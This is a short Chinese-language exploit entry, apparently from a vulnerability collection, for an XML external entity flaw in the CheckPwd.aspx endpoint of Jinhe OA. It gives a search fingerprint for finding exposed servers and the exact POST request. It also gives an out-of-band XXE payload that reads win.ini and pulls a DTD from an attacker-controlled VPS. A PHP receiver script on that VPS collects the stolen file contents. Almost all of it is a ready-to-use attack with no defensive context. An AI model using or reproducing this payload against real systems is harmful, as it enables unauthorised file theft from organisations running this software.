# 金和C6CheckPwd.aspxXML实体注入致任意文件读取漏洞-副本

- **系统**：金和OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /C6/JHSoft.Web.WorkFlat/CheckPwd.aspx/ HTTP/1.1`
- **关键头**：`Content-Type: application/Xml`

**请求体 / payload**
```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % remote SYSTEM "http://vpsip/xxe.dtd">
%remote;
%all;
]><root>&send;</root>
VPS准备两个文件
get.php
<?php
$data=$_GET['file'];
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>
xxe.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://vpsip/get.php?file=%file;'>">
python开启http服务，发送请求
读取的文件内容会回显到VPS
```
- **预期**：200　|　—